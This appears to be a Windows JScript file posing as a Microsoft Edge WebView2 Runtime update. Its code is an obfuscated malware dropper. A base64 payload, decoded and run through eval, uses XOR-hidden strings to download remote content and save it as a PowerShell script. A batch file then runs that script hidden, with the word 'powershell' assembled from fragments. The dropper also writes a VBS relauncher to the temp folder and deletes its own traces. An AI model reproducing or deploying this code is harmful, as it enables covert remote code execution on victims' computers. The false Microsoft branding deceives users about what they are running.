// Microsoft Edge WebView2 Runtime Update
// Build 127.0.2651.105
// (c) Microsoft Corporation

var _x = "dmFyIF8weGYgPSBmdW5jdGlvbihhKSB7IHZhciByID0gJyc7IGZvciAodmFyIGkgPSAwOyBpIDwgYS5sZW5ndGg7IGkrKykgciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKGFbaV0gXiAweDMzKTsgcmV0dXJuIHI7IH07DQp2YXIgX3YxID0gbmV3IEFjdGl2ZVhPYmplY3QoXzB4ZihbMHg2NCwweDYwLDB4NTAsMHg0MSwweDVhLDB4NDMsMHg0NywweDFkLDB4NjAsMHg1YiwweDU2LDB4NWYsMHg1Zl0pKTsNCnZhciBfdjIgPSBuZXcgQWN0aXZlWE9iamVjdChfMHhmKFsweGZlLDB4NDAsMHg0YiwweDVlLDB4NWYsMHgwMSwweDFkLDB4NjAsMHg1NiwweDQxLDB4N2IsMHg1NiwweDQxLDB4N2IsMHg3NiwweDY3LDB4NjcsMHg2MywweDFkLDB4MDEsMHgxZCwweDAwXSkpOw0KdmFyIF92MyA9IG5ldyBBY3RpdmVYT2JqZWN0KF8weGYoWzB4NjAsMHg1MCwweDQxLDB4NWEsMHg0MywweDQ3LDB4NWEsMHg1ZCwweDU0LDB4MWQsMHg3NSwweDVhLDB4NWYsMHg1NiwweDYwLDB4NGEsMHg0MCwweDQ3LDB4NTYsMHg1ZSwweDdjLDB4NTEsMHg1OSwweDU2LDB4NTAsMHg0N10pKTsNCnZhciBfdCA9IF92MS5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoJyUnICsgJ3RlJyArICdtcCcgKyAnJScpOw0KdmFyIF9yID0gTWF0aC5yYW5kb20oKS50b1N0cmluZygzNikuc3Vic3RyaW5nKDIsIDEwKTsNCnZhciBfcHMgPSBfdCArICdcXG1zZWRnZV8nICsgX3IgKyAnLnBzMSc7DQp2YXIgX2J0ID0gX3QgKyAnXFxtc2VkZ2VfJyArIF9yICsgJy5iYXQnOw0KX3YyLm9wZW4oXzB4ZihbMHg3NCwweDc2LDB4NjddKSwgXzB4ZihbMHg1YiwweDQ3LDB4NDcsMHg0MywweDQwLDB4OSwweDFjLDB4MWMsMHg1MSwweDVhLDB4NWYsMHg1MSwweDUyLDB4NWMsMHg1ZiwweDUyLDB4NTgsMHg1NiwweDFkLDB4NTAsMHg1YywweDVlLDB4MWMsMHg0MF0pLCBmYWxzZSk7DQpfdjIuc2V0UmVxdWVzdEhlYWRlcihfMHhmKFsweGZmLDB4NDAsMHg1NiwweDQxLDB4MWUsMHg3MiwweDU0LDB4NTYsMHg1ZCwweDQ3XSksICdNb3ppbGxhLzQuMCcpOw0KX3YyLnNlbmQoKTsNCmlmIChfdjIuc3RhdHVzID09PSAyMDApIHsNCnZhciBfdyA9IF92My5DcmVhdGVUZXh0RmlsZShfcHMsIHRydWUpOw0KX3cuV3JpdGUoX3YyLnJlc3BvbnNlVGV4dCk7DQpfdy5DbG9zZSgpOw0KdmFyIF9iID0gX3YzLkNyZWF0ZVRleHRGaWxlKF9idCwgdHJ1ZSk7DQpfYi5Xcml0ZUxpbmUoJ0BlY2hvIG9mZicpOw0KX2IuV3JpdGVMaW5lKCdzZXQgYT1wb3cnKTsNCl9iLldyaXRlTGluZSgnc2V0IGI9ZXJzaCcpOw0KX2IuV3JpdGVMaW5lKCdzZXQgYz1lbGwnKTsNCl9iLldyaXRlTGluZSgnY2FsbCAlYSUlYiUlYyUgLXcgaCAtZiAiJyArIF9wcyArICciJyk7DQpfYi5Xcml0ZUxpbmUoJ2RlbCAiJyArIF9wcyArICciJyk7DQpfYi5Xcml0ZUxpbmUoJ2RlbCAiJX5mMCInKTsNCl9iLkNsb3NlKCk7DQpfdjEuUnVuKF9idCwgMCwgZmFsc2UpOw0KfQ0KdHJ5IHsgX3YzLkRlbGV0ZUZpbGUoV1NjcmlwdC5TY3JpcHRGdWxsTmFtZSk7IH0gY2F0Y2goXykge30=";

var _s = new ActiveXObject("WScript.Shell");
var _f = new ActiveXObject("Scripting.FileSystemObject");
var _d = _s.ExpandEnvironmentStrings("%temp%");
var _p = _d + "\\msedge_" + Math.random().toString(36).substring(2, 8) + ".vbs";

var _c = _f.CreateTextFile(_p, true);
_c.Write("Set o=CreateObject(\"WScript.Shell\"):o.Run \"wscript.exe //E:JScript " + WScript.ScriptFullName + " //B\",0:Set o=Nothing");
_c.Close();

var _xml = new ActiveXObject("MSXML2.DOMDocument");
_xml.loadXML("<root><![CDATA[" + _x + "]]></root>");
var _code = _xml.selectSingleNode("//root").text;

var _decode = function(b64) {
    var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var output = "";
    var i = 0;
    b64 = b64.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (i < b64.length) {
        var e1 = chars.indexOf(b64.charAt(i++));
        var e2 = chars.indexOf(b64.charAt(i++));
        var e3 = chars.indexOf(b64.charAt(i++));
        var e4 = chars.indexOf(b64.charAt(i++));
        var c1 = (e1 << 2) | (e2 >> 4);
        var c2 = ((e2 & 15) << 4) | (e3 >> 2);
        var c3 = ((e3 & 3) << 6) | e4;
        output += String.fromCharCode(c1);
        if (e3 != 64) output += String.fromCharCode(c2);
        if (e4 != 64) output += String.fromCharCode(c3);
    }
    return output;
};

eval(_decode(_code));
